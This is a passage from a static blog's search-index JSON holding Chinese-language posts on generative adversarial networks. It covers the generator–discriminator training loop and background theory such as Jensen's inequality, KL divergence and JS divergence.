\u96c6\u6210\u4e86\u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff1a\u4e00\u65b9\u9762\uff0cGAN \u4f7f\u7528\u4e00\u4e2a\u7c7b\u4f3c Auto-encoder \u7ed3\u6784\u7684 Generator \u6765\u751f\u6210\u56fe\u50cf\uff0c\u53e6\u4e00\u65b9\u9762\u5b83\u7528\u4e00\u4e2a Discriminator \u6765\u8bc4\u4f30\u751f\u6210\u56fe\u7247\u7684\u8d28\u91cf\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#basic-idea_2","title":"Basic Idea","text":"<p>\u8003\u8651\u8fd9\u6837\u7684\u4e00\u4e2a\u8fc7\u7a0b\uff1a</p> <p>\u4e00\u5f00\u59cb\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u4e00\u4e2a generator \u548c discriminator\uff0c\u5b83\u4eec\u7684\u53c2\u6570\u90fd\u662f\u968f\u673a\u8bbe\u7f6e\u7684\u3002generator \u751f\u6210\u7684\u56fe\u7247\u5f88\u7cdf\u7cd5\uff0cdiscriminator \u4e5f\u65e0\u6cd5\u5224\u522b\u4ec0\u4e48\u56fe\u7247\u662f\u597d\u7684\u3002</p> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4ee5\u4e00\u4e2a\u9002\u5f53\u7684\u6982\u7387\u5206\u5e03\u968f\u673a\u5411\u8fd9\u4e2a generator \u4e2d\u8f93\u5165\u4e00\u7ec4\u5411\u91cf\uff0c\u7136\u540e\u5f97\u5230\u4e00\u5806\u751f\u6210\u7684\u56fe\u7247\uff0c\u7528\u8fd9\u4e9b\u56fe\u7247\u4f5c\u4e3a\u53cd\u4f8b\uff0c\u7528\u827a\u672f\u5bb6\u7ed8\u5236\u7684\u56fe\u7247\u4f5c\u4e3a\u6b63\u4f8b\u8bad\u7ec3 discriminator\u3002\u8fd9\u8f6e\u8bad\u7ec3\u540e\uff0c\u5f97\u5230\u7684 discriminator \u7684\u80fd\u529b\u5f97\u5230\u4e86\u63d0\u5347\uff0c\u80fd\u591f\u5b66\u4f1a\u7ed9\u4e00\u4e9b\u597d\u7684\u56fe\u7247\u6253\u9ad8\u5206\uff0c\u7ed9\u4e00\u4e9b\u5dee\u7684\u56fe\u7247\u6253\u4f4e\u5206\u3002</p> <p></p> <p>\u8fd9\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u56fa\u5b9a\u8fd9\u4e2a discriminator \u7684\u53c2\u6570\u3002\u6b64\u65f6\u5982\u679c\u6211\u4eec\u7ed9 generator \u8f93\u5165\u4e00\u4e2a\u5411\u91cf\uff0c\u518d\u628a\u5b83\u4ea7\u751f\u7684\u56fe\u7247\u9001\u5165 discriminator \u4e2d\uff0c\u6211\u4eec\u4f1a\u5f97\u5230\u4e00\u4e2a\u53cd\u9988\u7684\u5206\u6570\u3002\u8fd9\u4e2a\u53cd\u9988\u5206\u6570\u5c31\u53ef\u4ee5\u4f5c\u4e3a LOSS\uff0c\u6211\u4eec\u6839\u636e LOSS FUNCTION \u7684\u68af\u5ea6\u8c03\u6574 generator \u7684\u53c2\u6570\uff0c\u4f7f\u5f97\u5b83\u5c3d\u53ef\u80fd\u4ea7\u751f\u53ef\u4ee5\u9a97\u8fc7\u8fd9\u4e2a\u7248\u672c\u7684 discriminator\uff0c\u4ece\u5b83\u624b\u4e0b\u5f97\u5230\u4e00\u4e2a\u9ad8\u5206\u3002\u8fd9\u8f6e\u8bad\u7ec3\u540e\uff0c\u5f97\u5230\u7684 generator \u7684\u80fd\u529b\u4e5f\u5f97\u5230\u4e86\u63d0\u5347\uff0c\u80fd\u591f\u4ea7\u751f\u4e00\u4e9b\u50cf\u6837\u7684\u56fe\u7247\u4e86\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u53c8\u91cd\u590d\u4e0a\u9762\u7684\u8fc7\u7a0b\uff0c\u5f3a\u5316 discriminator\uff0cdiscriminator \u5f3a\u5316\u540e\u518d\u5f3a\u5316 generator\u3002\u3002\u3002\u53ef\u4ee5\u671f\u671b\u7684\u662f\uff0c\u591a\u8f6e\u8fed\u4ee3\u540e\uff0c\u6211\u4eec\u7684 generator \u548c discriminator \u90fd\u53ef\u4ee5\u53d8\u5f97\u5f88\u5f3a\u3002</p> <p></p> <p>\u4e0a\u56fe\u5f88\u597d\u7684\u4ece\u751f\u7269\u8fdb\u5316\u7684\u89d2\u5ea6\u5f88\u597d\u7684\u63ed\u793a\u4e86 GAN \u7684\u54f2\u5b66\u3002\u4e00\u5f00\u59cb\u8774\u8776\u989c\u8272\u4e94\u989c\u516d\u8272\u7684\uff0c\u505c\u5728\u6811\u4e0a\u7684\u65f6\u5019\uff0c\u6355\u98df\u5b83\u7684\u9e1f\u6839\u636e\u989c\u8272\u662f\u5426\u662f\u68d5\u8272\u6765\u533a\u5206\u5b83\u548c\u53f6\u5b50\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e9b\u4e94\u989c\u516d\u8272\u7684\u8774\u8776\u88ab\u6dd8\u6c70\u4e86\uff0c\u68d5\u8272\u7684\u8774\u8776\u8131\u9896\u800c\u51fa\uff0c\u6210\u529f\u9a97\u8fc7\u4e86\u521d\u4ee3\u9e1f\u3002\u4f46\u662f\u90a3\u4e9b\u88ab\u9a97\u8fc7\u7684\u521d\u4ee3\u9e1f\u4e5f\u4f1a\u88ab\u6dd8\u6c70\uff0c\u4e8e\u662f\u9e1f\u4e5f\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u8fdb\u5316\uff0c\u5b66\u4f1a\u4e86\u901a\u8fc7\u5224\u522b\u662f\u5426\u6709\u53f6\u8109\u6765\u5bfb\u627e\u730e\u7269\u3002\u800c\u8774\u8776\u5728\u8fd9\u4e00\u8fc7\u7a0b\u4e2d\u518d\u6b21\u8fdb\u5316\uff0c\u6210\u4e3a\u4e86\u67af\u53f6\u8776\u3002\u3002\u3002\u8fd9\u662f\u81ea\u7136\u754c\u4e2d\u7ecf\u5178\u7684\u826f\u6027\u7ade\u4e89\uff0c\u4e92\u76f8\u5f3a\u5316\u7684\u4f8b\u5b50\u3002\u800c Generative Adversarial Network \u4e2d\u7684\u201cAdversarial\u201d\u4e5f\u5c31\u662f\u8fd9\u6837\u6765\u7684\u3002\u5728 GAN \u4e2d\uff0c\u6211\u4eec\u8ba9\u4e00\u4e2a generator \u548c\u4e00\u4e2a discriminator \u4e92\u76f8\u5bf9\u6297\uff0cgenerator \u52aa\u529b\u7684\u751f\u6210\u903c\u771f\u7684\u56fe\u7247\u8bd5\u56fe\u9a97\u8fc7 discriminator\uff0cdiscriminator \u52aa\u529b\u5f3a\u5316\u81ea\u5df1\u7684\u8fa8\u522b\u80fd\u529b\u5bf9\u6297 generator \u7684\u6b3a\u9a97\u3002\u6a21\u578b\u7684\u5b66\u4e60\u5c31\u662f\u5728\u4e24\u8005\u7684\u5bf9\u6297\u4e4b\u4e2d\u4e92\u76f8\u5f3a\u5316\u800c\u5b8c\u6210\u7684\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#algorithm","title":"Algorithm","text":"<p>\u4e0a\u56fe\u662f GAN \u7684\u57fa\u672c\u8bad\u7ec3\u6a21\u5f0f\u3002\\(\\theta_d\\) \u548c \\(\\theta_g\\) \u5206\u522b\u662f Discriminator \u548c Generator \u7684\u53c2\u6570\uff0c\u4e00\u5f00\u59cb\u662f\u968f\u610f\u521d\u59cb\u5316\u7684\u3002</p> <p>\u6bcf\u4e00\u8f6e\u4e2d\uff1a</p> <p>\u9996\u5148\u4ece\u6570\u636e\u5e93\u4e2d\u91c7\u6837 m \u4e2a\u771f\u5b9e\u6837\u672c\\(\\{x_i\\}\\)\uff0c\u518d\u8ba9 Generator \u968f\u673a\u751f\u6210 m \u4e2a\u865a\u5047\u6837\u672c\\(\\{\\hat{x_i}\\}\\)\u3002</p> <p>\u5b9a\u4e49 \\(V=\\frac{1}{m}[\\;\\Sigma_{i=1}^{m}logD(x_i)+\\Sigma_{i=1}^{m}log(1-D(\\hat{x}_i))\\;]\\)</p> <p>\u771f\u5b9e\u6837\u672c\u5f97\u5206\u8d8a\u9ad8\uff0c\u865a\u5047\u6837\u672c\u5f97\u5206\u8d8a\u4f4e\uff0c\u8fd9\u4e2a V \u7684\u503c\u8d8a\u5927\u3002\u4e8e\u662f\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u68af\u5ea6\u4e0a\u5347\u6cd5\uff0c\u6700\u5927\u5316\u8fd9\u4e2a V\uff0c\u6211\u4eec\u7684 Discriminator \u5c31\u80fd\u5c3d\u53ef\u80fd\u7684\u5bf9\u771f\u5b9e\u6837\u672c\u7ed9\u51fa\u9ad8\u5206\uff0c\u5c3d\u53ef\u80fd\u7684\u7ed9\u865a\u5047\u6837\u672c\u7ed9\u51fa\u4f4e\u5206\u3002\u8fd9\u5b9e\u9645\u4e0a\u5c31\u662f\u5b8c\u6210\u4e86\u4e00\u4e2a\u5bf9 Discriminator \u7684\u5f3a\u5316\u3002</p> <p>\u5728\u8fd9\u4e4b\u540e\uff0c\u6211\u4eec\u518d\u53d6\u6837 m \u4e2a\u968f\u673a\u5411\u91cf\\({z_i}\\)\uff0c\u4e22\u5165 Generator\uff0c\u518d\u628a\u751f\u6210\u7684\u7ed3\u679c\u7ed9 Discriminator \u8bc4\u4f30\u3002</p> <p>\u5b9a\u4e49\\(V=\\frac{1}{m}\\Sigma_{i=1}^mlog(D(G(z_i)))\\)</p> <p>\u540c\u6837\u7684\uff0c\u6211\u4eec\u5e0c\u671b\u6700\u5927\u5316\u8fd9\u4e2a V \u503c\uff0c\u4f7f\u5f97\u4ea7\u751f\u7684\u7ed3\u679c\u5c3d\u53ef\u80fd\u9a97\u8fc7 Discriminator\u3002\u5c06 V \u503c\u5bf9 \\(\\theta_g\\) \u6c42\u504f\u5bfc\uff0c\u4f7f\u7528\u68af\u5ea6\u4e0a\u5347\u6765\u6700\u5927\u5316\u8fd9\u4e2a V\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9 Generator \u7684\u8c03\u4f18\u3002</p>"},{"location":"blog/2019/05/31/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/#comparision","title":"Comparision","text":"<p>\u5728 GAN \u7684\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5176\u660e\u663e\u4f18\u4e8e Auto-encoder \u548c Discriminator \u7684\u5730\u65b9\u3002Auto-encoder \u751f\u6210\u4e4b\u540e\uff0c\u7f3a\u4e4f\u4e00\u4e2a\u5f3a\u5927\u8bc4\u4f30\u53cd\u9988\uff0c\u7b80\u5355\u7684\u91c7\u7528\u539f\u56fe\u548c\u6062\u590d\u751f\u6210\u56fe\u7684\u5dee\u5411\u91cf\u8303\u6570\u6765\u8bc4\u4f30\uff0c\u65e0\u6cd5\u8003\u8651\u5230\u5404\u4e2a component \u4e4b\u95f4\u7684 correlation\uff0c\u7f3a\u4e4f\u4e00\u4e2a\u5927\u5c40\u89c2\u3002Discriminator \u867d\u7136\u80fd\u5bf9\u56fe\u7247\u4ea7\u751f\u5f88\u6df1\u7684\u7279\u5f81\u7406\u89e3\uff0c\u4f46\u662f\u7f3a\u5c11\u4e00\u4e2a\u9ad8\u6548\u51c6\u786e\u7684 proposal \u624b\u6bb5\uff0c\u8bad\u7ec3\u65f6\u5b83\u975e\u5e38\u4f9d\u8d56\u4e8e\u53cd\u4f8b\u7684\u751f\u6210\uff0c\u751f\u6210\u65f6\u53c8\u9700\u8981\u9009\u62e9\u4e00\u4e2a\u5019\u9009\u533a\u57df\u6765\u6267\u884c argmax\uff0c\u8fd9\u90fd\u4e0d\u662f\u5bb9\u6613\u89e3\u51b3\u7684\u95ee\u9898\u3002</p> <p>GAN \u5c06\u8fd9\u4e24\u8005\u7684\u7279\u6027\u505a\u4e86\u4e00\u4e2a\u7ed3\u5408\u3002\u867d\u7136\u8fd8\u662f\u91c7\u7528 button-up \u7684\u751f\u6210\u65b9\u5f0f\uff0c\u6839\u636e\u5411\u91cf\u5bf9\u6bcf\u4e00\u4e2a\u50cf\u7d20\u70b9\u5355\u72ec\u751f\u6210\uff0c\u4f46\u662f\u591a\u4e86\u4e00\u4e2a up-down \u8bc4\u4f30\u6a21\u5f0f\u7684 discriminator \u6765\u5bf9\u751f\u6210\u5185\u5bb9\u8fdb\u884c\u66f4\u52a0\u7ec6\u81f4\u7684\u8bc4\u4f30\u53cd\u9988\uff0c\u4ece\u800c generator \u80fd\u5f97\u5230\u66f4\u597d\u7684\u8bad\u7ec3\u6307\u5f15\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u7531\u4e8e\u6709\u4e86\u4e00\u4e2a\u66f4\u52a0\u5f3a\u5927\u7684 generator\uff0c\u8bad\u7ec3 discriminator \u65f6\uff0c\u80fd\u83b7\u5f97\u8d28\u91cf\u66f4\u9ad8\u7684\u53cd\u4f8b\uff0c\u4ece\u800c discriminator \u4e5f\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8bad\u7ec3\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/","title":"\u751f\u6210\u5f0f\u5bf9\u6297\u7f51\u7edc\u2014\u2014\u7406\u8bba","text":"<p>\u5728 \u5bf9\u6297\u5f0f\u751f\u6210\u7f51\u7edc - \u57fa\u7840 \u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u5bf9\u6297\u5f0f\u751f\u6210\u7f51\u7edc\uff08Generative Adversarial Networks, GAN\uff09\u7684\u57fa\u672c\u601d\u60f3\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u4e0e\u6700\u7ecf\u5178\u7684 Reflection Model \u4e0d\u4e00\u6837\uff0cGAN \u662f\u901a\u8fc7\u4e00\u7ec4\u7528\u4e8e\u751f\u6210\u7684 generator \u548c\u7528\u4e8e\u5224\u522b\u7684 discriminator \u4e92\u76f8\u5bf9\u6297\u6765\u5b9e\u73b0\u751f\u6210\u80fd\u529b\u7684\u81ea\u5f3a\u5316\u3002\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5f88\u7b80\u5355\u7684\u4ecb\u7ecd\u4e86\u5b83\u7684 intuition\uff0c\u4f46 GAN \u672c\u8d28\u4e0a\u8fd8\u662f\u4e00\u4e2a\u6570\u5b66\u6a21\u578b\uff0c\u4e3a\u4ec0\u4e48\u80fd\u5b9e\u73b0\u81ea\u5f3a\u5316\uff0c\u4e3a\u4ec0\u4e48\u6a21\u578b\u6700\u540e\u4f1a\u5411\u6211\u4eec\u5e0c\u671b\u7684\u65b9\u5411\u6536\u655b\uff0c\u5b83\u8fd8\u9700\u8981\u4e00\u4e9b\u66f4\u52a0\u4e25\u8c28\u7684\u7406\u8bba\u63a8\u5bfc\u3002</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u6839\u636e\u300aTOWARDS PRINCIPLED METHODS FOR TRAINING GENERATIVE ADVERSARIAL NETWORKS\u300b(Arjovsky et al. 2017) \u548c \u300aWasserstein GAN\u300b(Arjovsky et al. 2017) \u8fd9\u4e24\u7bc7\u8bba\u6587\u7684\u63a8\u5bfc\u548c\u8bba\u8ff0\uff0c\u7b80\u5355\u7684\u8ba8\u8bba\u4e00\u4e0b GAN \u7684\u6570\u5b66\u7406\u8bba\u3002</p> <p>\u5728\u5c55\u5f00 GAN \u7684\u8ba8\u8bba\u4e4b\u524d\uff0c\u6211\u4eec\u5c06\u4f1a\u5148\u7b80\u5355\u7684\u4ecb\u7ecd\u51e0\u4e2a\u9700\u8981\u7528\u5230\u7684\u524d\u7f6e\u6982\u5ff5\u548c\u77e5\u8bc6\u3002\u5728\u8fd9\u4e4b\u540e\u6211\u4eec\u4f1a\u4ecb\u7ecd\u539f\u59cb GAN \u7684 loss function \u7684\u5b9e\u9645\u6570\u5b66\u610f\u4e49\uff0c\u5e76\u7b80\u5355\u8ba8\u8bba\u5176\u5b58\u5728\u7684\u95ee\u9898\uff0c\u6700\u540e\u8ba8\u8bba\u89e3\u51b3\u7684\u65b9\u6cd5\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u7406\u8bba\u51c6\u5907","title":"\u7406\u8bba\u51c6\u5907","text":""},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#jensen-\u4e0d\u7b49\u5f0f","title":"Jensen \u4e0d\u7b49\u5f0f","text":"<p>\u4f17\u6240\u5468\u77e5\uff0c\u5728\u4e00\u4e2a\u51f8\u51fd\u6570\uff0c\u5176\u5b9a\u4e49\u57df\u4e0a\u7684\u4efb\u610f\u4e24\u70b9 \\(x_1,x_2\\)\uff0c\u5728 \\(0\\leq t \\leq1\\) \u65f6\uff0c\u6ee1\u8db3\uff1a</p> \\[ tf(x_1)+(1-t)f(x_2) \\geq f[tx_1+(1-t)x_2] \\] <p>\u8fd9\u5c31\u662f Jensen \u4e0d\u7b49\u5f0f\u6700\u8457\u540d\u7684\u4e24\u70b9\u5f62\u5f0f\u3002Jensen \u7684\u4e24\u70b9\u4e0d\u7b49\u5f0f\u53ef\u4ee5\u88ab\u63a8\u5e7f\u5230\u4efb\u610f\u591a\u6570\u91cf\u7684\u70b9\u96c6\\(\\{x_i\\}\\)\u4e0a\uff1a\u5f53\\(\\lambda_i \\geq0\\)\u4e14\\(\\Sigma \\lambda_i=1\\)\u65f6\uff0c\u51f8\u51fd\u6570\\(f(x)\\)\u6ee1\u8db3 \\(f(\\Sigma\\lambda_ix_i)\\leq \\Sigma\\lambda_if(x_i)\\)\u3002\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\u53ef\u4ee5\u8bc1\u660e\u8fd9\u4e00\u63a8\u5e7f\u5f0f\u3002</p> <p>\u5f88\u5bb9\u6613\u60f3\u5230\uff0c\u5f53\u4e0a\u5f0f\u53d6\u6781\u9650\u65f6\uff0c\u6211\u4eec\u5219\u4f1a\u5f97\u5230\u8fde\u7eed\u57df\u4e0a\u7684 Jensen \u4e0d\u7b49\u5f0f\uff1a</p> \\[ \\int p(x)dx=1\\;=&gt;f[\\int p(x)xdx]\\leq \\int p(x)f(x)dx \\] <p>\u628a\u4e0a\u5f0f\u653e\u5230\u6982\u7387\u8bba\u4e2d\uff0c\u5982\u679c p(x) \u770b\u4f5c\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff0c\u90a3\u4e48\u4e0a\u5f0f\u663e\u7136\u7b49\u4ef7\u4e8e\uff1a</p> \\[ f[E(x)]\\leq E[f(x)] \\]"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#kl-\u6563\u5ea6","title":"KL \u6563\u5ea6","text":"<p>\u8003\u8651\u4e00\u4e2a\u771f\u5b9e\u7684\u6982\u7387\u5206\u5e03 p(x) \u548c\u4e00\u4e2a\u5bf9\u8fd9\u4e2a\u6982\u7387\u5206\u5e03\u8fdb\u884c\u62df\u5408\u7684\u53e6\u4e00\u4e2a\u8fd1\u4f3c\u5206\u5e03 q(x)\uff0c\u6211\u4eec\u5982\u4f55\u8bc4\u4f30\u8fd9\u4e2a\u8fd1\u4f3c\u5206\u5e03\u597d\u4e0d\u597d\uff1f\u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u5982\u4f55\u53bb\u91cf\u5316\u8fd9\u4e2a\u8fd1\u4f3c\u8bc4\u4f30\u548c\u771f\u5b9e\u8bc4\u4f30\u7684\u5dee\u5f02\uff1f</p> <p>KL \u6563\u5ea6\uff08Kullback-Leibler divergence\uff09\u662f\u4e00\u4e2a\u9009\u62e9\u3002KL \u6563\u5ea6\u53c8\u5e38\u5e38\u88ab\u79f0\u4e3a\u76f8\u5bf9\u71b5\uff08relative entropy\uff09\u6216\u8005\u4fe1\u606f\u6563\u5ea6\uff08information divergence\uff09\uff0c\u662f\u4e24\u4e2a\u6982\u7387\u5206\u5e03\u95f4\u5dee\u5f02\u7684\u975e\u5bf9\u79f0\u6027\u5ea6\u91cf\u3002</p> <p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u4e24\u4e2a\u6982\u7387\u5206\u5e03 p \u548c q\uff0cKL \u6563\u5ea6\u5b9a\u4e49\u5982\u4e0b\uff1a</p> \\[ KL(p||q) =\\int p(x)ln[\\frac {p(x)}{q(x)}]dx \\] <p>\u76f4\u89c2\u7684\u6765\u770b\uff0c\u5bf9\u4e8e\u70b9 x \u5904\uff0cKL \u6563\u5ea6\u5c06\u4e24\u4e2a\u5206\u5e03\u7684\u5dee\u5f02\u635f\u5931\u5b9a\u4e49\u4e3a\\(p(x)ln[\\frac{p(x)}{q(x)}]\\)\uff0c\u663e\u7136\u53ea\u6709\u4e24\u4e2a\u5206\u5e03\u90fd\u5728\u6b64\u5904\u53d6\u76f8\u540c\u7684\u6982\u7387\u5bc6\u5ea6\uff0c\u8fd9\u4e2a\u635f\u5931\u624d\u4e3a 0\uff0c\u5e76\u4e14\u5728\u771f\u5b9e\u5206\u5e03 p \u4e2d\u51fa\u73b0\u9891\u7387\u66f4\u9ad8\u7684 x \u5904\u7684\u635f\u5931\u6240\u4eab\u6709\u7684\u6743\u91cd\u4e5f\u4f1a\u66f4\u5927\u3002\u56e0\u6b64\uff0c\u4ece\u76f4\u89c2\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u786e\u5b9e\u5728\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u53cd\u6620\u4e86\u4e24\u4e2a\u5206\u5e03\u4e4b\u95f4\u7684\u62df\u5408\u7a0b\u5ea6\u3002</p> <p>\u9664\u4e86\u76f4\u89c2\u610f\u4e49\uff0c\u5b83\u5728\u6570\u5b66\u4e0a\u4e5f\u6709\u4e24\u4e2a\u5f88\u597d\u7684\u6027\u8d28\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u6027\u8d28-1","title":"\u6027\u8d28 1","text":"<p>KL(p||q) &gt;= 0, \u5f53\u4e14\u4ec5\u5f53 p=q \u65f6\uff0c\u7b49\u53f7\u6210\u7acb\u3002</p> \\[ KL(p||q)=\\int p(x)ln[\\frac{p(x)}{q(x)}]dx\\\\ \u4ee4 g(x)=\\frac{q(x)}{p(x)}\\\\ KL(p||q)=\\int -p(x)ln[g(x)]dx \\\\-ln(x) \u4e3a\u51f8\u51fd\u6570\uff0c\u7531 Jensen \u4e0d\u7b49\u5f0f=&gt;\\\\ KL(p||q)=E[-ln(g(x))]\\geq -ln[E(g(x))]\\\\ =-ln\\{\\int p(x)\\frac{q(x)}{p(x)}dx\\}=-ln(1)=0\\\\ \u5f97\u8bc1 \\]"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u6027\u8d28-2","title":"\u6027\u8d28 2","text":"<p>\u6700\u5c0f\u5316 KL \u6563\u5ea6\u7b49\u4ef7\u4e8e\u6700\u5927\u5316\u4f3c\u7136\u51fd\u6570</p> \\[ q(x) \u662f p(x) \u7684\u8fd1\u4f3c\\\\ =&gt;q(x)=P(x;\\theta)\uff0c\\theta \u662f\u8fd9\u4e2a\u8fd1\u4f3c\u5668\u7684\u53c2\u6570\\\\ argmin\\;KL(p||q)=argmax\\;\\int p(x)ln[q(x)]-\\int p(x)ln[p(x)]\\\\ =argmax\\;\\int p(x)ln[q(x)]\\\\ \\approx argmax\\;\\frac{1}{N}\\Sigma\\;ln[q(x_i)]\\\\ =argmax\\; \\frac{1}{N}\\;\\Pi\\;q(x_i) \\\\ =argmax\\;\\frac{1}{N} \\;\\Pi\\;P(x_i;\\theta) \\] <p>\u5982\u4e0a\u6240\u793a\uff0c\u5bf9\u4e8e p(x) \u505a\u53c2\u6570\u4f30\u8ba1\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u4f3c\u7136\u51fd\u6570\uff1a\\(\\frac{1}{N}\\;\\Pi\\;P(x;\\theta)\\)\uff0c\u6700\u5927\u5316\u8fd9\u4e2a\u4f3c\u7136\u51fd\u6570\u7684\u76f4\u89c2\u610f\u4e49\u5c31\u662f\u4f7f\u5f97\u8fd9\u4e2a\u8fd1\u4f3c\u5206\u5e03\u4e2d\uff0c\u5c3d\u91cf\u8ba9\u5b9e\u9a8c\u4e2d\u51fa\u73b0\u6b21\u6570\u591a\u7684\u6837\u672c x \u53d6\u66f4\u5927\u7684\u6982\u7387\u503c\uff0c\u8fd9\u662f\u6781\u5927\u4f3c\u7136\u7684\u57fa\u672c\u60f3\u6cd5\u3002</p> <p>\u63a8\u5bfc\u53d1\u73b0\uff0c\u6700\u5c0f\u5316 KL \u6563\u5ea6\uff0c\u5b9e\u9645\u4e0a\u5c31\u7b49\u4ef7\u4e8e\u6700\u5927\u5316\u8fd9\u4e2a\u4f3c\u7136\u51fd\u6570\u3002\uff08\u8fd9\u53ef\u4ee5\u770b\u4f5c KL \u6563\u5ea6\u4e4b\u6240\u4ee5\u662f\u4e00\u4e2a\u201c\u826f\u597d\u201d\u6d4b\u5ea6\u91cf\u7684\u539f\u56e0\u3002\uff09</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#js-\u6563\u5ea6","title":"JS \u6563\u5ea6","text":"<p>JS \u6563\u5ea6\uff08Jensen-Shannon divergence\uff09\uff0c\u548c KL \u6563\u5ea6\u4e00\u6837\uff0c\u4e5f\u662f\u7528\u6765\u8861\u91cf\u4e24\u6761\u66f2\u7ebf\u7684\u76f8\u5408\u6027\u7684\u3002</p> <p>\u5728 KL \u6563\u5ea6\u4e2d p \u548c q \u7684\u5730\u4f4d\u4e0d\u7b49\u4ef7\uff0c\u4ea4\u6362 p \u548c q \u5f97\u5230\u7684\u7ed3\u679c\u662f\u4e0d\u4e00\u6837\u7684\u3002\u5982\u679c\u628a\u6563\u5ea6\u5f53\u4f5c\u67d0\u79cd\u201c\u8ddd\u79bb\u201d\u7684\u8861\u91cf\uff0c\u90a3\u4e48\u5728 KL \u6563\u5ea6\u5b9a\u4e49\u7684\u8ddd\u79bb\u7a7a\u95f4\u4e2d\uff0c\u4e24\u4e2a\u5bf9\u8c61\u4e4b\u95f4\u7684\u8ddd\u79bb\u5c31\u662f\u4e0d\u5bf9\u79f0\u7684\u3002\u4f46\u662f\u5728\u4e00\u4e9b\u95ee\u9898\u80cc\u666f\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u66f4\u5e0c\u671b\u4f7f\u7528\u5177\u6709\u5bf9\u79f0\u6027\u7684\u201c\u8ddd\u79bb\u201d\u3002</p> <p>JS \u6563\u5ea6\u7684\u5b9a\u4e49\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u4e86 KL \u6563\u5ea6\u7684\u4e0d\u5bf9\u79f0\u95ee\u9898\uff1a</p> \\[ JS(P1||P2)=\\frac{1}{2}KL(P1||\\frac{P1+P2}{2})+\\frac{1}{2}KL(P2||\\frac{P1+P2}{2}) \\] <p>\u5982\u4e0a\u6240\u793a\uff0c\u5b83\u76f4\u63a5\u4ece KL \u6563\u5ea6\u7684\u5b9a\u4e49\u4e2d\u505a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u53d8\u6362\uff0c\u76f4\u89c2\u610f\u4e49\u53ef\u4ee5\u7406\u89e3\u4e3a P1 \u548c P2 \u4e0e\u8fd9\u4e24\u8005\u7684\u4e2d\u7ebf\"\u8ddd\u79bb\"\u7684\u5747\u503c\u3002\u5173\u4e8e\u5176\u4e25\u683c\u7684\u6570\u5b66\u6027\u8d28\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u53d6\u67e5\u9605\u76f8\u5173\u7684\u8d44\u6599\u3002</p>"},{"location":"blog/2019/06/14/%E7%94%9F%E6%88%90%E5%BC%8F%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%90%86%E8%AE%BA/#\u521d\u4ee3-gan-\u7684\u6536\u655b\u6027","title":"\u521d\u4ee3 GAN \u7684\u6536\u655b\u6027","text":"<p>2014 \u5e74\u65f6\uff0cGoodfellow \u5728\u300aGenerative Adversarial Nets\u300b\u4e2d\u9996\u6b21\u63d0\u51fa GAN 